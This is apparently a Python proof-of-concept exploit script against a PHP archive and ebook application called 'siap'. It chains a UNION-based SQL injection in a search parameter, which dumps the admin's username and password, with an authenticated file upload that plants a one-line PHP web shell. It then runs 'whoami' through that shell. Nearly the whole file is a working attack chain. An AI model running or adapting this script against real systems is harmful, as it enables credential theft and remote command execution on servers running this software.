# Chaining SQLi (Union) -> File Upload
import requests
from bs4 import BeautifulSoup

login_url = 'http://localhost/siap/admin/cek.php'
arsip_url = 'http://localhost/siap/Arsip_Ebook.php?cari=a'
upload_url = 'http://localhost/siap/admin/tambahKP.php'
shell_url = 'http://localhost/siap/image/koleksi/union.php?1=whoami'

session = requests.Session()

header = {'Content-Type':'application/x-www-form-urlencoded'}
payload = "' union select null,username,password,null,null,null,null,null from user-- -"
crafted_url = arsip_url + payload

print("[i] Gaining information")
r = requests.post(url=crafted_url)
soup = BeautifulSoup(r.text, 'html.parser')
table_body = soup.find('tbody')
rows = table_body.find_all('tr')

creds = []
for row in rows:
    cols = row.find_all('td')
    uname = cols[1].text.strip()
    pwd = cols[2].text.strip()
    if uname.lower() == "admin":
        creds.append(f"{uname}:{pwd}")

username, password = creds[0].split(':')

body_data = f'username={username}&password={password}&login=LOGIN'
r = session.post(url=login_url, data=body_data)

pshell = '<?=`$_GET[1]`?>'

form_data = {
    'judul': (None, 'KP-EvilShell'),
    'penulis': (None,'Ardias'),
    'nim': (None,'1337'),
    'jurusan': (None,'Teknik Sipil'),
    'dosbimKP': (None, ' RDX'),
    'dosbimKP1': (None, 'ARDX'),
    'subjek': (None, 'YesSir'),
    'barcode': (None, '1337'),
    'accno': (None, '1337'),
    'laporan': ('union.php', pshell, 'application/x-php'),
    'simpan': (None, 'Tambah')
}

print('[i] Upload Shell')
r = session.post(url=upload_url, files=form_data)
if 'Berhasil Ditambahkan !' in r.text:
    print('[+] File Uploaded!')
else:
    print('[-] Failed to upload :(')

print(f'[i] Accessing Shell url in: {shell_url}')
r = requests.get(url=shell_url)
print('Resp:',r.text)
